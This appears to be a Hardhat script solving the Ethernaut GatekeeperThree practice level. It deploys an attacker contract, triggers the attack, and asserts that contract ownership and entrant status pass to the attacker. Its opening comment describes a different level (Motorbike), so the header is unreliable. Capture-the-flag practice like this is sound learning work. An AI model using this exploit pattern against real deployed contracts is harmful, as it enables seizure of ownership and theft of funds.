/*
  Would you be able to selfdestruct its engine and make the motorbike unusable ?
    selfdestruct the Engine contract
*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();
  
  let tx;
  let txReceipt;

  const GateKeeperThreeContractAddress = "0x8a20915c00c21277C5B5117fb9616A1f7a680b87";
  
  // Creating an instance of the GateKeeperThree contract
  this.gatekeeperThree = await hre.ethers.getContractAt("GatekeeperThree",GateKeeperThreeContractAddress);

  console.log(
    `
    GateKeeperThreeContractAddress ${GateKeeperThreeContractAddress} \n
    Initial values on the GateKeeperThree contract:
    owner: ${await this.gatekeeperThree.owner()} \n
    entrant: ${await this.gatekeeperThree.entrant()} \n
    allow_enterance: ${await this.gatekeeperThree.allow_enterance()} \n
    trick: ${await this.gatekeeperThree.trick()} \n
    `
  );
    
  // Validating setups!
  expect(await this.gatekeeperThree.allow_enterance()).to.eq(false);
  

  // Deploying the Attacker contract
  console.log("Deploying the Attacker contract");
  const AttackGateKeeperThree = await hre.ethers.getContractFactory("AttackGateKeeperThree");
  this.attackGateKeeperThree = await AttackGateKeeperThree.connect(player).deploy(this.gatekeeperThree.address,{value: hre.ethers.utils.parseEther("0.002")});
  await this.attackGateKeeperThree.deployed();

  expect(await this.attackGateKeeperThree.gateKeeperThree()).to.eq(this.gatekeeperThree.address);

  console.log("\n\n Performing attack ... \n\n");

  tx = await this.attackGateKeeperThree.connect(player).initiateAttack({gasLimit: 2000000});
  await tx.wait();

  // Validating results after attack!
  expect(await this.gatekeeperThree.allow_enterance()).to.eq(true);
  expect(await this.gatekeeperThree.owner()).to.eq(this.attackGateKeeperThree.address);
  expect(await this.gatekeeperThree.entrant()).to.eq(player.address);


  console.log(
    `
    Final values on the GateKeeperThree contract after the attack is completed: \n\n
    owner: ${await this.gatekeeperThree.owner()} \n
    entrant: ${await this.gatekeeperThree.entrant()} \n
    allow_enterance: ${await this.gatekeeperThree.allow_enterance()} \n
    trick: ${await this.gatekeeperThree.trick()} \n
    `
  );
   

  console.log("\n\n ========================== Attack Completed!!!! ==========================");


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});